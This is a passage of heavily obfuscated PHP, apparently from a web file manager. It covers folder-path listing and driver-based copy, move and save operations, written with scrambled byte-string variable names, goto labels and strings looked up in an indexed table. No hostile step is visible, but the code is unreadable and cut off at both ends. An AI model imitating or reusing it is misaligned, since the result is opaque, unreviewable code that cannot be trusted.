$B®±™°Ü÷ã[$F÷‹«Æ•…¤[524]]; $c¤Æ–¤Ø[$F÷‹«Æ•…¤[528]] = $B®±™°Ü÷ã[$F÷‹«Æ•…¤[529]]; goto Eç½…ŒÀ¿; a¥ƒ©™—¢È: $B¦êíÙÇê† = $this->parentLevelArray($B®±™°Ü÷ã[$F÷‹«Æ•…¤[524]]); $aÒõ‚•¡â¯ = $F÷‹«Æ•…¤[43]; foreach ($B¦êíÙÇê† as $Eí¿î¬‘ŸÈ) { $DªèŠ±Áê¥ = Model($F÷‹«Æ•…¤[525])->getInfo($Eí¿î¬‘ŸÈ); $aÒõ‚•¡â¯ .= $DªèŠ±Áê¥[$F÷‹«Æ•…¤[95]][$F÷‹«Æ•…¤[406]] . $F÷‹«Æ•…¤[57]; } goto e†®–ˆôŠ¡; aìáò¼‰ã†: } protected function _listAppendPath(&$eÅ˜®Ìº, $D¤¡‰©ÎÃ = false) { goto A±¤Êß; fõ•Æİô‹±: unset($f¡«­™‰‰); $aÉˆäÌÀÇ = array_unique($aÉˆäÌÀÇ); if (count($aÉˆäÌÀÇ) > 0) { $E¼¬õÒ‘¯¬ = array($C«ÖÅ Â[421] => array($C«ÖÅ Â[422], $aÉˆäÌÀÇ)); if (count($aÉˆäÌÀÇ) == 1) { $Aì‹ƒ¹¡²‹ = $this->sourceInfo($aÉˆäÌÀÇ[0]); $B„„ƒĞ÷’ = is_array($Aì‹ƒ¹¡²‹) ? array($Aì‹ƒ¹¡²‹) : !1; } else { $B„„ƒĞ÷’ = $this->field($C«ÖÅ Â[531])->where($E¼¬õÒ‘¯¬)->select(); } if (!$B„„ƒĞ÷’) { $B„„ƒĞ÷’ = array(); } foreach ($B„„ƒĞ÷’ as $bæÇÇÓ’º) { $e©›¢‚ƒø[$bæÇÇÓ’º[$C«ÖÅ Â[406]]] = $bæÇÇÓ’º[$C«ÖÅ Â[38]]; } } goto EÑÑ×ôÒÁ°; eÑœÏØÜ—: unset($f¡«­™‰‰); return $eÅ˜®Ìº; goto Bá»âÉÊ’; Aî«¿ì‰ : $A‡·†ñĞš = array(); if ($D¤¡‰©ÎÃ) { return $e©›¢‚ƒø; } foreach ($eÅ˜®Ìº as &$f¡«­™‰‰) { goto E—µÔ•´­; aÊ® ‚ÉŠ˜: foreach ($Bíäî‘„®¢ as $B·æİíÆº => $Eø‡‡‰Ñˆ—) { if (isset($e©›¢‚ƒø[$Eø‡‡‰Ñˆ—])) { continue; } if ($B·æİíÆº == 0) { $e©›¢‚ƒø[$Eø‡‡‰Ñˆ—] = $this->_listAppendPathRoot($f¡«­™‰‰, $Bíäî‘„®¢); } if ($B·æİíÆº != 0) { $aÉˆäÌÀÇ[] = $Eø‡‡‰Ñˆ—; } } goto D±èÀÂêÍ; A¯­©×Ï¼ª: if (isset($A‡·†ñĞš[$f¡«­™‰‰[$C«ÖÅ Â[524]]])) { continue; } $A‡·†ñĞš[$f¡«­™‰‰[$C«ÖÅ Â[524]]] = !0; $Bíäî‘„®¢ = $this->parentLevelArray($f¡«­™‰‰[$C«ÖÅ Â[524]]); goto aÊ® ‚ÉŠ˜; E—µÔ•´­: $c‡¤Â•ÖÉé = $f¡«­™‰‰[$C«ÖÅ Â[406]]; if ($f¡«­™‰‰[$C«ÖÅ Â[414]] == $C«ÖÅ Â[97] && $f¡«­™‰‰[$C«ÖÅ Â[501]] != 0) { $e©›¢‚ƒø[$c‡¤Â•ÖÉé] = $f¡«­™‰‰[$C«ÖÅ Â[38]]; } if ($f¡«­™‰‰[$C«ÖÅ Â[414]] == $C«ÖÅ Â[97] && $f¡«­™‰‰[$C«ÖÅ Â[501]] == 0 && !isset($e©›¢‚ƒø[$c‡¤Â•ÖÉé])) { $e©›¢‚ƒø[$c‡¤Â•ÖÉé] = $this->_listAppendPathRoot($f¡«­™‰‰, array()); } goto A¯­©×Ï¼ª; D±èÀÂêÍ: } goto fõ•Æİô‹±; EÑÑ×ôÒÁ°: $fÕóô°„îÖ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $E¹ŒâÆÌ­Š = array(); foreach ($eÅ˜®Ìº as &$f¡«­™‰‰) { goto C¢‹¤†“«§; C¢‹¤†“«§: $eÎ›—¤À«† = $f¡«­™‰‰[$C«ÖÅ Â[524]]; $dÍÎê‚¿åÅ = $C«ÖÅ Â[43]; if (isset($E¹ŒâÆÌ­Š[$eÎ›—¤À«†])) { $dÍÎê‚¿åÅ = $E¹ŒâÆÌ­Š[$eÎ›—¤À«†]; } else { $Bíäî‘„®¢ = $this->parentLevelArray($f¡«­™‰‰[$C«ÖÅ Â[524]]); foreach ($Bíäî‘„®¢ as $B·æİíÆº => $Eø‡‡‰Ñˆ—) { if (isset($e©›¢‚ƒø[$Eø‡‡‰Ñˆ—])) { $dÍÎê‚¿åÅ .= $e©›¢‚ƒø[$Eø‡‡‰Ñˆ—] . $C«ÖÅ Â[8]; } } $E¹ŒâÆÌ­Š[$eÎ›—¤À«†] = $dÍÎê‚¿åÅ; } goto A±·ÑƒØèÉ; A±·ÑƒØèÉ: $dÍÎê‚¿åÅ .= $f¡«­™‰‰[$C«ÖÅ Â[38]]; if ($f¡«­™‰‰[$C«ÖÅ Â[414]] == $C«ÖÅ Â[97]) { $dÍÎê‚¿åÅ .= $C«ÖÅ Â[8]; } $f¡«­™‰‰[$C«ÖÅ Â[522]] = str_replace($C«ÖÅ Â[532], $C«ÖÅ Â[8], $dÍÎê‚¿åÅ); goto c¹¿â£Òî›; c¹¿â£Òî›: if ($f¡«­™‰‰[$C«ÖÅ Â[501]] == $C«ÖÅ Â[201]) { $f¡«­™‰‰[$C«ÖÅ Â[38]] = trim($e©›¢‚ƒø[$f¡«­™‰‰[$C«ÖÅ Â[406]]], $C«ÖÅ Â[8]); $f¡«­™‰‰[$C«ÖÅ Â[522]] = $f¡«­™‰‰[$C«ÖÅ Â[38]] . $C«ÖÅ Â[8]; } if (intval($f¡«­™‰‰[$C«ÖÅ Â[415]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($f¡«­™‰‰, $Bíäî‘„®¢, $fÕóô°„îÖ); } goto fÆ’‡ˆá„Ø; fÆ’‡ˆá„Ø: } goto eÑœÏØÜ—; A±¤Êß: $C«ÖÅ Â =& $_SERVER[œÕÊİğö]; static $e©›¢‚ƒø = array(); $aÉˆäÌÀÇ = array(); goto Aî«¿ì‰ ; Bá»âÉÊ’: } private function _listAppendPathRecycle(&$fÃŠÆïæ­, $Dñ­µ¯´˜ï, $A¥ÌÉƒÀ’®) { goto EÃïˆ–ƒì; e¶ë½ó´†: $còÒ‡¾ÎÚ = implode($A´¤ä´¦´²[8], array_slice($d‹õÌ’×†œ, 2)); $fÃŠÆïæ­[$A´¤ä´¦´²[522]] = $A´¤ä´¦´²[8] . LNG($A´¤ä´¦´²[533]) . $A´¤ä´¦´²[8] . ltrim($còÒ‡¾ÎÚ, $A´¤ä´¦´²[8]); $fÃŠÆïæ­[$A´¤ä´¦´²[524]] = $A´¤ä´¦´²[534] . implode($A´¤ä´¦´²[57], array_slice($Dñ­µ¯´˜ï, 1)) . $A´¤ä´¦´²[57]; goto E¢²•­Êò³; EÃïˆ–ƒì: $A´¤ä´¦´² =& $_SERVER[œÕÊİğö]; if (!in_array($A¥ÌÉƒÀ’®, $Dñ­µ¯´˜ï) && $fÃŠÆïæ­[$A´¤ä´¦´²[406]] != $A¥ÌÉƒÀ’®) { return; } $d‹õÌ’×†œ = explode($A´¤ä´¦´²[8], trim($fÃŠÆïæ­[$A´¤ä´¦´²[522]], $A´¤ä´¦´²[8])); goto e¶ë½ó´†; E¢²•­Êò³: if ($fÃŠÆïæ­[$A´¤ä´¦´²[406]] == $A¥ÌÉƒÀ’®) { $fÃŠÆïæ­[$A´¤ä´¦´²[524]] = $A´¤ä´¦´²[534]; $fÃŠÆïæ­[$A´¤ä´¦´²[501]] = $A´¤ä´¦´²[201]; $fÃŠÆïæ­[$A´¤ä´¦´²[38]] = LNG($A´¤ä´¦´²[533]); } $fÃŠÆïæ­[$A´¤ä´¦´²[535]] = $A´¤ä´¦´²[536]; goto c‡¥º¨•­; c‡¥º¨•­: } protected function _listAppendPathRoot(&$a‰§®¦ê¥æ, $FŠ“Ãçšç–) { $aÅ‰è’œ‡¯ =& $_SERVER[œÕÊİğö]; $EÄ÷Õ¾Î«£ = $aÅ‰è’œ‡¯[43]; if ($a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[415]] == self::TYPE_USER) { if (defined($aÅ‰è’œ‡¯[477]) && $a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[507]] == USER_ID) { $EÄ÷Õ¾Î«£ = LNG($aÅ‰è’œ‡¯[537]); if (!$FŠ“Ãçšç–) { $a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[38]] = $EÄ÷Õ¾Î«£; } } else { $Cä÷ÑÇßò = Model($aÅ‰è’œ‡¯[516])->getInfoSimple($a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[507]]); $EÄ÷Õ¾Î«£ = LNG($aÅ‰è’œ‡¯[538]) . $aÅ‰è’œ‡¯[170] . $Cä÷ÑÇßò[$aÅ‰è’œ‡¯[38]] . $aÅ‰è’œ‡¯[539]; } } else { if ($a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[415]] == self::TYPE_GROUP) { $Cä÷ÑÇßò = Model($aÅ‰è’œ‡¯[525])->getInfoSimple($a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[507]]); $EÄ÷Õ¾Î«£ = $Cä÷ÑÇßò[$aÅ‰è’œ‡¯[38]]; } else { if ($a‰§®¦ê¥æ[$aÅ‰è’œ‡¯[415]] == self::TYPE_SYSTEM) { $EÄ÷Õ¾Î«£ = $aÅ‰è’œ‡¯[540]; } } } $EÄ÷Õ¾Î«£ = $EÄ÷Õ¾Î«£ ? $aÅ‰è’œ‡¯[8] . $EÄ÷Õ¾Î«£ . $aÅ‰è’œ‡¯[8] : $aÅ‰è’œ‡¯[8]; return $EÄ÷Õ¾Î«£; } protected function _listAppendUser(&$BÖ¼ß• Ó) { goto DÑàŠò†Ö; DÑàŠò†Ö: $aíËğÅ£‘ô =& $_SERVER[œÕÊİğö]; $c¡ê“‡©ïÎ = array_to_keyvalue($BÖ¼ß• Ó, $aíËğÅ£‘ô[43], $aíËğÅ£‘ô[455]); $A°Íª®èŞ = array_to_keyvalue($BÖ¼ß• Ó, $aíËğÅ£‘ô[43], $aíËğÅ£‘ô[457]); goto eóƒò³Èä£; Då‡ºÀšİ¿: unset($BŞéÙÅŒ¸É); goto f±ŞæøÌÈ³; eóƒò³Èä£: $E³„Òº†Û = array_merge($c¡ê“‡©ïÎ, $A°Íª®èŞ); $eäÆ¸ÔˆõÙ = Model($aíËğÅ£‘ô[541])->userListInfo($E³„Òº†Û); foreach ($BÖ¼ß• Ó as &$BŞéÙÅŒ¸É) { $fŸ–íãÇÖ› = $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[455]]; $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[455]] = $eäÆ¸ÔˆõÙ[$fŸ–íãÇÖ›] ? $eäÆ¸ÔˆõÙ[$fŸ–íãÇÖ›] : !1; $fŸ–íãÇÖ› = $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[457]]; $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[457]] = $eäÆ¸ÔˆõÙ[$fŸ–íãÇÖ›] ? $eäÆ¸ÔˆõÙ[$fŸ–íãÇÖ›] : !1; if (isset($BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]]) && $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]][$aíËğÅ£‘ô[542]]) { $D×¼ÅÒÕ©‡ = $GLOBALS[$aíËğÅ£‘ô[6]][$aíËğÅ£‘ô[98]][$aíËğÅ£‘ô[543]]; if ($BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]][$aíËğÅ£‘ô[544]] <= time() - $D×¼ÅÒÕ©‡) { $this->metaSet($BŞéÙÅŒ¸É[$aíËğÅ£‘ô[406]], $aíËğÅ£‘ô[542], null); $this->metaSet($BŞéÙÅŒ¸É[$aíËğÅ£‘ô[406]], $aíËğÅ£‘ô[544], null); unset($BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]][$aíËğÅ£‘ô[542]]); continue; } $A‡ö©‚Á Ü = $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]][$aíËğÅ£‘ô[542]]; $BŞéÙÅŒ¸É[$aíËğÅ£‘ô[468]][$aíËğÅ£‘ô[545]] = Model($aíËğÅ£‘ô[541])->getInfoSimpleOuter($A‡ö©‚Á Ü); } } goto Då‡ºÀšİ¿; f±ŞæøÌÈ³: } public function parentLevelArray($Få…¡Ó‘±Î) { $f¹˜ÜÎ“³® =& $_SERVER[œÕÊİğö]; $Få…¡Ó‘±Î = explode($f¹˜ÜÎ“³®[57], trim($Få…¡Ó‘±Î, $f¹˜ÜÎ“³®[57])); return array_remove_value($Få…¡Ó‘±Î, $f¹˜ÜÎ“³®[201]); } public function listAll($c×–ªŸ‚„) { goto cŸ¡Ü¤Òéœ; a‡ÂîòØƒô: $E±ùòË¤ = $BÜ‹«‹†½ƒ[550]; $FõÕ´·­®ğ = "\114\105\106\124\40\112\117\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\146\151\154\x65\40\x66\151\x6c\145\x20\x6f\x6e\x20\163\157\x75\162\x63\145\x2e\146\x69\154\x65\x49\104\x20\x3d\40\146\151\x6c\x65\56\x66\151\x6c\145\x49\104"; $CõÜá‡—Œß = $this->alias($BÜ‹«‹†½ƒ[447])->field($E±ùòË¤)->where($A½Õœªª†)->join($FõÕ´·­®ğ)->select(); goto EøÌ”§êÚó; bçÊÌÈ…ßä: $CõÜá‡—Œß = array_to_keyvalue($CõÜá‡—Œß, $BÜ‹«‹†½ƒ[406]); $aÅ¿Ñ¤ğ–± = "\x2f{$bóº£õó“×[$BÜ‹«‹†½ƒ[38]]}\x2f"; $aÅ¿Ñ¤ğ–± = $aÅ¿Ñ¤ğ–± == $BÜ‹«‹†½ƒ[532] ? $BÜ‹«‹†½ƒ[8] : $aÅ¿Ñ¤ğ–±; goto d•ÌìÅÇ¹Â; d•ÌìÅÇ¹Â: $Bî¬ä­ÈÆÚ = array(); foreach ($CõÜá‡—Œß as $CÚ‰‹„ÇèĞ => $bÖ·¢Ğ³“Ñ) { goto bóÒ·İöæÙ; b›í£´¾ëÑ: $C®•Ğˆø ­ = str_replace($BÜ‹«‹†½ƒ[532], $BÜ‹«‹†½ƒ[8], $C®•Ğˆø ­); $C®•Ğˆø ­ = str_replace($BÜ‹«‹†½ƒ[532], $BÜ‹«‹†½ƒ[8], $C®•Ğˆø ­); $B„ÇÁšŒ = array($BÜ‹«‹†½ƒ[425] => str_replace($BÜ‹«‹†½ƒ[532], $BÜ‹«‹†½ƒ[8], $C®•Ğˆø ­), $BÜ‹«‹†½ƒ[551] => intval($bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[414]]), $BÜ‹«‹†½ƒ[95] => $this->pathInfoFilter($bÖ·¢Ğ³“Ñ)); goto B˜ÀÇ²îã»; B˜ÀÇ²îã»: if (!$bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[414]]) { $B„ÇÁšŒ[$BÜ‹«‹†½ƒ[470]] = $bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[470]]; $B„ÇÁšŒ[$BÜ‹«‹†½ƒ[96]] = $bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[86]]; } $Bî¬ä­ÈÆÚ[] = $B„ÇÁšŒ; goto eÃÖÔ»É‡Ï; f‚ñÈ¿«Ş½: for ($F¡“’ù­¥Ç = 0; $F¡“’ù­¥Ç < count($E®ËÒ­Ä²‘); $F¡“’ù­¥Ç++) { $C®•Ğˆø ­ .= $CõÜá‡—Œß[$E®ËÒ­Ä²‘[$F¡“’ù­¥Ç]][$BÜ‹«‹†½ƒ[38]] . $BÜ‹«‹†½ƒ[8]; } $C®•Ğˆø ­ .= $bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[38]]; if ($bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[414]]) { $C®•Ğˆø ­ .= $BÜ‹«‹†½ƒ[8]; } goto b›í£´¾ëÑ; bóÒ·İöæÙ: $E®ËÒ­Ä²‘ = $this->parentLevelArray($bÖ·¢Ğ³“Ñ[$BÜ‹«‹†½ƒ[524]]); array_shift($E®ËÒ­Ä²‘); $C®•Ğˆø ­ = $aÅ¿Ñ¤ğ–±; goto f‚ñÈ¿«Ş½; eÃÖÔ»É‡Ï: } return $Bî¬ä­ÈÆÚ; goto A‘ÁºÌ¶…¥; EøÌ”§êÚó: $this->_listAppendAuth($CõÜá‡—Œß); $this->_listAppendUser($CõÜá‡—Œß); $this->_listAppendPath($CõÜá‡—Œß); goto bçÊÌÈ…ßä; cŸ¡Ü¤Òéœ: $BÜ‹«‹†½ƒ =& $_SERVER[œÕÊİğö]; $bóº£õó“× = $this->sourceInfo($c×–ªŸ‚„); $A½Õœªª† = array($BÜ‹«‹†½ƒ[546] => array($BÜ‹«‹†½ƒ[547], $bóº£õó“×[$BÜ‹«‹†½ƒ[524]] . $c×–ªŸ‚„ . $BÜ‹«‹†½ƒ[548]), $BÜ‹«‹†½ƒ[549] => 0); goto a‡ÂîòØƒô; A‘ÁºÌ¶…¥: } } goto c¨³×äÏèÇ; C¤³Ûç¿Ï: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bÔ„‚Äí¨¦, $eÍ‘ã¬ÌŠŠ) { goto cÌ¬¸Š¼¬; dæÏÂ¿ÑÔ­: Hook::trigger($BĞ›ÁŞÎİ[1066] . $bÔ„‚Äí¨¦ . $BĞ›ÁŞÎİ[1069], $bâ¡¦«÷½ğ, $CŒÍ³Ø¹ï); return $CŒÍ³Ø¹ï; goto c‰Î«©»äŠ; cÌ¬¸Š¼¬: $BĞ›ÁŞÎİ =& $_SERVER[œÕÊİğö]; $bâ¡¦«÷½ğ = $eÍ‘ã¬ÌŠŠ; $GLOBALS[$BĞ›ÁŞÎİ[1065]] = $BĞ›ÁŞÎİ[1066] . $bÔ„‚Äí¨¦; goto Fº®ò½Œ; Fº®ò½Œ: Hook::trigger($BĞ›ÁŞÎİ[1066] . $bÔ„‚Äí¨¦ . $BĞ›ÁŞÎİ[1067], $bâ¡¦«÷½ğ); $AëÉÚŠÚ§Ö = self::driverMake($eÍ‘ã¬ÌŠŠ[0]); if (method_exists($AëÉÚŠÚ§Ö, $bÔ„‚Äí¨¦)) { $CŒÍ³Ø¹ï = @call_user_func_array(array($AëÉÚŠÚ§Ö, $bÔ„‚Äí¨¦), $eÍ‘ã¬ÌŠŠ); } else { if (method_exists($AëÉÚŠÚ§Ö, $BĞ›ÁŞÎİ[1068])) { $CŒÍ³Ø¹ï = @call_user_func_array(array($AëÉÚŠÚ§Ö, $bÔ„‚Äí¨¦), $eÍ‘ã¬ÌŠŠ); } else { if (method_exists(self, $bÔ„‚Äí¨¦)) { $CŒÍ³Ø¹ï = @call_user_func_array(array(self, $bÔ„‚Äí¨¦), $eÍ‘ã¬ÌŠŠ); } else { $CŒÍ³Ø¹ï = call_user_func_array(array(parent, $bÔ„‚Äí¨¦), $eÍ‘ã¬ÌŠŠ); } } } goto dæÏÂ¿ÑÔ­; c‰Î«©»äŠ: } public static function init($DÂÛ²å§Â) { return self::driverMake($DÂÛ²å§Â); } public static function copy($c•æ„‚çóì, $d ­‘õé¾, $fÏÔï¿ñĞ = false, $BæÂ¸‡ñâ¯ = false) { return self::copyMoveStart($c•æ„‚çóì, $d ­‘õé¾, $fÏÔï¿ñĞ, $_SERVER[œÕÊİğö][552], $BæÂ¸‡ñâ¯); } public static function move($f¸ĞÂ»‘œà, $F­¼Šôåñó, $F÷½”«Á…’ = false, $AèÇ‚ì°Ê´ = false) { return self::copyMoveStart($f¸ĞÂ»‘œà, $F­¼Šôåñó, $F÷½”«Á…’, $_SERVER[œÕÊİğö][554], $AèÇ‚ì°Ê´); } private static function copyMoveStart($DÄ¿Ñ¬†íµ, $A˜¡Õ¸İ¯, $FÃÎÁÒ»ÙÜ, $b†—ŞŠ×’, $A‰çŠŒ…öÒ) { $d¼¹Æéß‹Š =& $_SERVER[œÕÊİğö]; $D´¸‹Ü¦… = array($DÄ¿Ñ¬†íµ, $A˜¡Õ¸İ¯, $FÃÎÁÒ»ÙÜ, $A‰çŠŒ…öÒ); Hook::trigger($d¼¹Æéß‹Š[1066] . $b†—ŞŠ×’ . $d¼¹Æéß‹Š[1067], $D´¸‹Ü¦…); $FÖ«‡Õ¹‰› = self::copyMove($DÄ¿Ñ¬†íµ, $A˜¡Õ¸İ¯, $FÃÎÁÒ»ÙÜ, $b†—ŞŠ×’, $A‰çŠŒ…öÒ); Hook::trigger($d¼¹Æéß‹Š[1066] . $b†—ŞŠ×’ . $d¼¹Æéß‹Š[1069], $D´¸‹Ü¦…, $FÖ«‡Õ¹‰›); return $FÖ«‡Õ¹‰›; } public static function saveFile($D•÷’‹ï·, $aÖôÛ­¿¡, $B®Şâ…º‡É = true) { goto cíÊÔ„àåó; b¬•Æ§ø§: if ($CÅÌ–×°‘->pathParse[$c õ”µ•İ³[1070]]) { $CÅÌ–×°‘ = self::driverMake($CÅÌ–×°‘->pathParse[$c õ”µ•İ³[1070]]); } $B—¨­ãÑ’· = $Dí¢åö°ÁŞ->pathFather($aÖôÛ­¿¡); $e†ÍóàÏ˜ = !0; goto dÓë‘Şô„; cíÊÔ„àåó: $c õ”µ•İ³ =& $_SERVER[œÕÊİğö]; $B¾çö÷ñò“ = self::info($aÖôÛ­¿¡); $CÅÌ–×°‘ = self::driverMake($D•÷’‹ï·); goto A¢¼øĞµ¶ä; dÓë‘Şô„: if (!$B®Şâ…º‡É && self::driverIsSame($CÅÌ–×°‘, $Dí¢åö°ÁŞ)) { $e†ÍóàÏ˜ = !1; } $DÂëµ®’°ê = self::copyFile($CÅÌ–×°‘, $D•÷’‹ï·, $Dí¢åö°ÁŞ, $B—¨­ãÑ’·, $B¾çö÷ñò“[$c õ”µ•İ³[38]], $e†ÍóàÏ˜); if ($BšÚØ´ÈÑ‰) { $DÂëµ®’°ê = $BšÚØ´ÈÑ‰->getPathOuter($DÂëµ®’°ê); } goto d•ùäÒ«²; A¢¼øĞµ¶ä: $Dí¢åö°ÁŞ = self::driverMake($aÖôÛ­¿¡); $BšÚØ´ÈÑ‰ = !1; if ($Dí¢åö°ÁŞ->pathParse[$c õ”µ•İ³[1070]]) { $BšÚØ´ÈÑ‰ = $Dí¢åö°ÁŞ; $Dí¢åö°ÁŞ = self::driverMake($Dí¢åö°ÁŞ->pathParse[$c õ”µ•İ³[1070]]); } goto b¬•Æ§ø§; d•ùäÒ«²: return $DÂëµ®’°ê; goto C¼™£…ïÅß; C¼™£…ïÅß: } private static function copyMove($DÏØç¬×†ò, $eºèØ×ìßë, $bŒÁ¹İ¡–, $cÎŞÈ­Ü ¸, $A¢®°Ûî…— = false) { goto E©ê²ÑŞÙ‘; F° „ì«Õ: if ($f›±ŠÅâÑŞ) { if ($cÎŞÈ­Ü ¸ == $B½Éå§Ó÷Ã[554] && !method_exists($aæ™…˜Ì, $B½Éå§Ó÷Ã[1071]) && trim($eºèØ×ìßë, $B½Éå§Ó÷Ã[8]) == trim($aæ™…˜Ì->pathFather($DÏØç¬×†ò), $B½Éå§Ó÷Ã[8])) { if ($C¬ïÊà’¨÷->pathThis($DÏØç¬×†ò) != $A¢®°Ûî…— && !$C¬ïÊà’¨÷->isTypeObject()) { return $C¬ïÊà’¨÷->rename($DÏØç¬×†ò, $A¢®°Ûî…—); } return $aæ™…˜Ì->getPathOuter($DÏØç¬×†ò); } if (method_exists($aæ™…˜Ì, $cÎŞÈ­Ü ¸)) { return $aæ™…˜Ì->{$cÎŞÈ­Ü ¸}($DÏØç¬×†ò, $eºèØ×ìßë, $bŒÁ¹İ¡–); } } $FÂâøŒ¹²• = $C¬ïÊà’¨÷->isFile($DÏØç¬×†ò); if (!$FÂâøŒ¹²• && $aæ™…˜Ì->getType() == $B½Éå§Ó÷Ã[748] && $C¬ïÊà’¨÷->getType() == $B½Éå§Ó÷Ã[116]) { $Cµö¶ßÀšŸ = $aæ™…˜Ì->copyFolderFromIO($C¬ïÊà’¨÷, $DÏØç¬×†ò, $eºèØ×ìßë, $bŒÁ¹İ¡–, $FŞ•ªÖ, $A¢®°Ûî…—); } else { $Cµö¶ßÀšŸ = self::copyPath($C¬ïÊà’¨÷, $DÏØç¬×†ò, $aæ™…˜Ì, $eºèØ×ìßë, $bŒÁ¹İ¡–, $FŞ•ªÖ, $FÂâøŒ¹²•, $A¢®°Ûî…—); } goto dµÂ¯Ôİ§; AëËÆ´×Çë: self::check($C¬ïÊà’¨÷, $DÏØç¬×†ò, $aæ™…˜Ì, $eºèØ×ìßë); Hook::trigger($B½Éå§Ó÷Ã[83], $C¬ïÊà’¨÷, $DÏØç¬×†ò, $aæ™…˜Ì, $eºèØ×ìßë); $f›±ŠÅâÑŞ = self::driverIsSame($C¬ïÊà’¨÷, $aæ™…˜Ì); goto F° „ì«Õ; E©ê²ÑŞÙ‘: $B½Éå§Ó÷Ã =& $_SERVER[œÕÊİğö]; if (!$DÏØç¬×†ò || $DÏØç¬×†ò == $B½Éå§Ó÷Ã[8] || !$eºèØ×ìßë) { return !1; } ignore_timeout(); goto EÃªƒÔŞ±©; EÃªƒÔŞ±©: $C¬ïÊà’¨÷ = self::driverMake($DÏØç¬×†ò); $aæ™…˜Ì = self::driverMake($eºèØ×ìßë); $FŞ•ªÖ = $cÎŞÈ­Ü ¸ == $B½Éå§Ó÷Ã[554]; goto b²å£ŒÜØ; dµÂ¯Ôİ§: if ($Cµö¶ßÀšŸ && $FŞ•ªÖ) { $C¬ïÊà’¨÷->remove($DÏØç¬×†ò); } if ($Aï²šÂ“Ù§) { $Cµö¶ßÀšŸ = $Aï²šÂ“Ù§->getPathOuter($Cµö¶ßÀšŸ); } return $Cµö¶ßÀšŸ; goto B¹Äß“Ş–; b²å£ŒÜØ: $Aï²šÂ“Ù§ = !1; if ($aæ™…˜Ì->pathParse[$B½Éå§Ó÷Ã[1070]]) { $Aï²šÂ“Ù§ = $aæ™…˜Ì; $aæ™…˜Ì = self::driverMake($aæ™…˜Ì->pathParse[$B½Éå§Ó÷Ã[1070]]); } if ($C¬ïÊà’¨÷->pathParse[$B½Éå§Ó÷Ã[1070]]) { $C¬ïÊà’¨÷ = self::driverMake($C¬ïÊà’¨÷->pathParse[$B½Éå§Ó÷Ã[1070]]); } goto AëËÆ´×Çë; B¹Äß“Ş–: } private static function check($B¥éñË•…, $dğºôŞ‰Ó, $e†•ùõœ’», &$Fµã‚¬ØÂ) { $a©êÑ¸Ëˆ» =& $_SERVER[œÕÊİğö]; if (self::driverIsSame($B¥éñË•…, $e†•ùõœ’») && $B¥éñË•…->isFolder($dğºôŞ‰Ó) && $B¥éñË•…->isParentOf($dğºôŞ‰Ó, $Fµã‚¬ØÂ)) { show_json(LNG($a©êÑ¸Ëˆ»[1072]), !1); } if (!$B¥éñË•…->exist($dğºôŞ‰Ó)) { show_json(LNG($a©êÑ¸Ëˆ»[115]), !1); } } private static function copyPath($E»ò¦Êª©†, $A„“ÆğæìÇ, $d‹¨¼ĞóÑ, $E—ÅÏîß¹Î, $aÏÇ›ÕõÃº, $f•¾ºÍ¸•¾, $e³¤Á„±øÎ, $bÉ‚Õ¾±ßĞ = false) { goto fË ¥ÃçÅ÷; bééÜ»‰ª: $fŠ¾Ë™èÇ = $d‹¨¼ĞóÑ->mkdir($d‹¨¼ĞóÑ->getPath($dÏÜ¸Î¾“Â)); $E—ÅÏîß¹Î = $d‹¨¼ĞóÑ->getPathInner($fŠ¾Ë™èÇ); $dÜ—¨˜ğŞõ = $E»ò¦Êª©†->listPath($A„“ÆğæìÇ, !0); goto B†¹å££ãà; fË ¥ÃçÅ÷: $fƒ§¯Ìé¸ =& $_SERVER[œÕÊİğö]; $aƒ…ì©õ›é = empty($bÉ‚Õ¾±ßĞ) && $bÉ‚Õ¾±ßĞ !== $fƒ§¯Ìé¸[201] ? $E»ò¦Êª©†->pathThis($A„“ÆğæìÇ) : $bÉ‚Õ¾±ßĞ; if ($aÏÇ›ÕõÃº) { $a¶ì‚´™¿« = $d‹¨¼ĞóÑ->fileNameExist($E—ÅÏîß¹Î, $aƒ…ì©õ›é); $aƒ…ì©õ›é = $d‹¨¼ĞóÑ->fileNameAuto($E—ÅÏîß¹Î, $aƒ…ì©õ›é, $aÏÇ›ÕõÃº, !$e³¤Á„±øÎ); $aÏÇ›ÕõÃº = $a¶ì‚´™¿« ? $aÏÇ›ÕõÃº : !1; } goto bÎåô‹¾À¦; bÎåô‹¾À¦: if ($e³¤Á„±øÎ) { return self::copyFile($E»ò¦Êª©†, $A„“ÆğæìÇ, $d‹¨¼ĞóÑ, $E—ÅÏîß¹Î, $aƒ…ì©õ›é, $f•¾ºÍ¸•¾); } if ($aÏÇ›ÕõÃº == REPEAT_RENAME_FOLDER) { $aÏÇ›ÕõÃº = !1; } $dÏÜ¸Î¾“Â = rtrim($E—ÅÏîß¹Î, $fƒ§¯Ìé¸[8]) . $fƒ§¯Ìé¸[8] . $aƒ…ì©õ›é; goto bééÜ»‰ª; B†¹å££ãà: $dÜ—¨˜ğŞõ = is_array($dÜ—¨˜ğŞõ) ? $dÜ—¨˜ğŞõ : array($fƒ§¯Ìé¸[84] => array(), $fƒ§¯Ìé¸[85] => array()); $E’Œ±îŸ = 